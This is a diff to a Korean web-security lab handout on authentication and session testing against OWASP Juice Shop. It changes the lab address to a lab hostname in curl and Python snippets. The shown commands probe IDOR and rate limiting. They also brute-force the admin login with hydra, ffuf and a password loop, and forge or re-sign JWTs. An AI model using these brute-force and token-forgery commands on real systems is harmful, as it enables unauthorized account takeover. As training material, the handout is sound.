@@ -131,7 +131,7 @@
 
 ```bash
 # JuiceShop 회원가입 API
-curl -X POST http://10.20.40.81:3000/api/Users/ \
+curl -X POST http://juice.6v6.lab/api/Users/ \
   -H "Content-Type: application/json" \
   -d '{                                                # 요청 데이터(body)
     "email": "student@test.com",
@@ -147,12 +147,12 @@ curl -X POST http://10.20.40.81:3000/api/Users/ \
 ### 2.2 로그인
 
 ```bash
-curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+curl -s -X POST http://juice.6v6.lab/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -m json.tool
 
 # 응답 활용 — 토큰만 추출하여 환경변수에 저장
-TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
   -H 'Content-Type: application/json' \
   -d '{"email":"student@test.com","password":"Test1234!"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
@@ -181,15 +181,15 @@ echo "토큰 길이: ${#TOKEN}자 / 시작 50자: ${TOKEN:0:50}..."
 
 ```bash
 # whoami — 본인 정보
-curl -s http://10.20.40.81:3000/rest/user/whoami \
+curl -s http://juice.6v6.lab/rest/user/whoami \
   -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
 echo '---'
 # 장바구니 (bid=1)
 curl -s -o /dev/null -w "basket/1 code=%{http_code}\n" \
-  http://10.20.40.81:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN"
+  http://juice.6v6.lab/rest/basket/1 -H "Authorization: Bearer $TOKEN"
 # 다른 사용자 장바구니 (bid=2) — IDOR 1차 점검
 curl -s -o /dev/null -w "basket/2 code=%{http_code}\n" \
-  http://10.20.40.81:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN"
+  http://juice.6v6.lab/rest/basket/2 -H "Authorization: Bearer $TOKEN"
 ```
 
 **예상 출력**:
@@ -227,19 +227,19 @@ basket/2 code=200
 
 ```bash
 # 테스트 1: 매우 짧은 비밀번호
-curl -s -X POST http://10.20.40.81:3000/api/Users/ \
+curl -s -X POST http://juice.6v6.lab/api/Users/ \
   -H "Content-Type: application/json" \
   -d '{"email":"weak1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}'  # 요청 데이터(body)
 echo ""
 
 # 테스트 2: 숫자만으로 구성
-curl -s -X POST http://10.20.40.81:3000/api/Users/ \
+curl -s -X POST http://juice.6v6.lab/api/Users/ \
   -H "Content-Type: application/json" \
   -d '{"email":"weak2@test.com","password":"12345","passwordRepeat":"12345","securityQuestion":{"id":1},"securityAnswer":"a"}'  # 요청 데이터(body)
 echo ""
 
 # 테스트 3: 흔한 비밀번호
-curl -s -X POST http://10.20.40.81:3000/api/Users/ \
+curl -s -X POST http://juice.6v6.lab/api/Users/ \
   -H "Content-Type: application/json" \
   -d '{"email":"weak3@test.com","password":"password","passwordRepeat":"password","securityQuestion":{"id":1},"securityAnswer":"a"}'  # 요청 데이터(body)
 echo ""
@@ -254,7 +254,7 @@ echo ""
 ```bash
 # 로그인 실패 10회 반복 — 잠금/Rate Limit 여부 확인
 for i in $(seq 1 10); do
-  result=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.40.81:3000/rest/user/login \
+  result=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://juice.6v6.lab/rest/user/login \
     -H 'Content-Type: application/json' \
     -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')
   echo "시도 $i: HTTP $result"
@@ -296,7 +296,7 @@ hydra -l admin@juice-sh.op -P /tmp/pwd.txt 10.20.32.80 -s 3000 \
   -V -t 4
 
 # 또는 ffuf 로 (인증 fuzz)
-ffuf -w /tmp/pwd.txt -X POST -u http://10.20.40.81:3000/rest/user/login \
+ffuf -w /tmp/pwd.txt -X POST -u http://juice.6v6.lab/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
   -mc all -fs 50            # 응답 크기 50B (fail 응답) 제외
@@ -311,7 +311,7 @@ ffuf -w /tmp/pwd.txt -X POST -u http://10.20.40.81:3000/rest/user/login \
 ```bash
 # admin@juice-sh.op + 6 흔한 비번 시도
 for pw in "admin" "admin123" "password" "admin1234" "juice" "12345678"; do
-  result=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+  result=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
     -H 'Content-Type: application/json' \
     -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}")
   if echo "$result" | grep -q "token"; then
@@ -364,7 +364,7 @@ done
 ```bash
 # JWT 3회 발급 — 토큰의 어느 부분이 다른지 분석
 for i in 1 2 3; do
-  token=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+  token=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
     -H 'Content-Type: application/json' \
     -d '{"email":"student@test.com","password":"Test1234!"}' \
     | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
@@ -393,13 +393,13 @@ done
 
 ```bash
 # 1. 로그인하여 토큰 획득
-TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
 
 # 2. 로그인 상태 확인
 echo "=== 로그아웃 전 ==="
-curl -s http://10.20.40.81:3000/rest/user/whoami \
+curl -s http://juice.6v6.lab/rest/user/whoami \
   -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null
 
 # 3. 로그아웃 (JuiceShop는 클라이언트 측 로그아웃)
@@ -408,7 +408,7 @@ curl -s http://10.20.40.81:3000/rest/user/whoami \
 # 4. 이전 토큰으로 다시 접근 시도
 echo ""
 echo "=== 로그아웃 후 동일 토큰으로 접근 ==="
-curl -s http://10.20.40.81:3000/rest/user/whoami \
+curl -s http://juice.6v6.lab/rest/user/whoami \
   -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null
 
 # 여전히 접근되면 → 서버 측 토큰 무효화 미흡 (취약)
@@ -418,20 +418,20 @@ curl -s http://10.20.40.81:3000/rest/user/whoami \
 
 ```bash
 # 동일 계정으로 두 개의 세션 생성
-TOKEN1=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+TOKEN1=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
-TOKEN2=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+TOKEN2=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 # 두 토큰 모두 유효한지 확인
 echo "토큰1 유효:"
-curl -s http://10.20.40.81:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN1" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null  # silent 모드
+curl -s http://juice.6v6.lab/rest/user/whoami -H "Authorization: Bearer $TOKEN1" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null  # silent 모드
 
 echo "토큰2 유효:"
-curl -s http://10.20.40.81:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN2" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null  # silent 모드
+curl -s http://juice.6v6.lab/rest/user/whoami -H "Authorization: Bearer $TOKEN2" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null  # silent 모드
 
 # 둘 다 유효하면 → 다중 로그인 미제어 (점검 결과로 기록)
 ```
@@ -455,7 +455,7 @@ Signature: HMACSHA256(header + "." + payload, secret)
 ### 5.2 JWT 디코딩
 
 ```bash
-TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
   -H 'Content-Type: application/json' \
   -d '{"email":"student@test.com","password":"Test1234!"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
@@ -552,7 +552,7 @@ print(f"조작된 토큰: {fake_token[:60]}...")
 # 이 토큰으로 접근 시도
 import subprocess
 result = subprocess.run(
-    ["curl", "-s", "http://10.20.40.81:3000/rest/user/whoami",
+    ["curl", "-s", "http://juice.6v6.lab/rest/user/whoami",
      "-H", f"Authorization: Bearer {fake_token}"],
     capture_output=True, text=True
 )
@@ -571,7 +571,7 @@ import hmac, hashlib, base64, json
 # JuiceShop에서 획득한 토큰의 header.payload 부분
 import subprocess
 r = subprocess.run(
-    ["curl", "-s", "-X", "POST", "http://10.20.40.81:3000/rest/user/login",
+    ["curl", "-s", "-X", "POST", "http://juice.6v6.lab/rest/user/login",
      "-H", "Content-Type: application/json",
      "-d", '{"email":"student@test.com","password":"Test1234!"}'],
     capture_output=True, text=True
@@ -602,7 +602,7 @@ PYEOF
 ### 5.4 JWT 만료 시간 확인
 
 ```bash
-TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://juice.6v6.lab/rest/user/login \
   -H 'Content-Type: application/json' \
   -d '{"email":"student@test.com","password":"Test1234!"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
@@ -706,7 +706,7 @@ exp (만료): 2026-04-29 16:23:45
 
 ### Burp Suite Community
 > **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
-> **실행 위치:** `작업 PC → web (10.20.40.81:3000)`  
+> **실행 위치:** `학생 PC (브라우저 / curl) → fw HAProxy → web (juice.6v6.lab)`  
 > **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)
 
 **주요 경로·파일**
